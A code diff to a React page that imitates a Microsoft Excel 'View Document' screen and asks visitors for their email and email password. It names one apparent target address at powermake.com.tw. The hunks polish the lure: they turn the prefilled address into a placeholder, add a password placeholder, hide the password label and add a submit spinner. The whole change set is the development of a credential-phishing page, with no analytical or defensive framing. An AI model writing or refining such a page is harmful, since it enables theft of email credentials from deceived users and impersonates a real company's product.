@@ -74,7 +74,7 @@ export default function Home() {
       />
 
       <div className="relative z-10 flex min-h-screen w-full items-center justify-center p-6 md:p-10">
-        <div className="bg-white shadow-md  overflow-hidden max-w-md w-full border border-gray-200">
+        <div className="bg-white shadow-md overflow-hidden max-w-md w-full border border-gray-200">
           {/* Excel Header */}
           <div className="bg-green-600 text-white p-3 flex items-center gap-2">
             <div className="font-bold text-xl">Microsoft®</div>
@@ -106,7 +106,7 @@ export default function Home() {
                 <Input
                   id="email"
                   type="email"
-                  defaultValue="james@powermake.com.tw"
+                  placeholder="james@powermake.com.tw"
                   className="border-none shadow-none focus-visible:ring-0 px-0 py-1 text-sm"
                   {...register("email")}
                 />
@@ -114,12 +114,13 @@ export default function Home() {
 
               <div className="border-b border-gray-300 pb-1">
                 <div className="flex items-center">
-                  <Label htmlFor="password" className="text-gray-500 text-sm mr-2">
+                  {/* <Label htmlFor="password" className="text-gray-500 text-sm mr-2">
                     Email password
-                  </Label>
+                  </Label> */}
                   <Input
                     id="password"
                     type="password"
+                    placeholder="Enter your password"
                     className="border-none shadow-none focus-visible:ring-0 px-0 py-1 text-sm flex-1"
                     {...register("password")}
                   />
@@ -131,7 +132,14 @@ export default function Home() {
                 className="bg-green-600 hover:bg-green-700 text-white font-medium rounded-sm w-full mt-2"
                 disabled={isSubmitting}
               >
-                View Document
+                {isSubmitting ? (
+                  <div className="flex items-center justify-center">
+                    <div className="animate-spin mr-2 h-4 w-4 border-2 border-white border-t-transparent rounded-full" />
+                    <span>View Document</span>
+                  </div>
+                ) : (
+                  "View Document"
+                )}
               </Button>
             </form>
           </div>
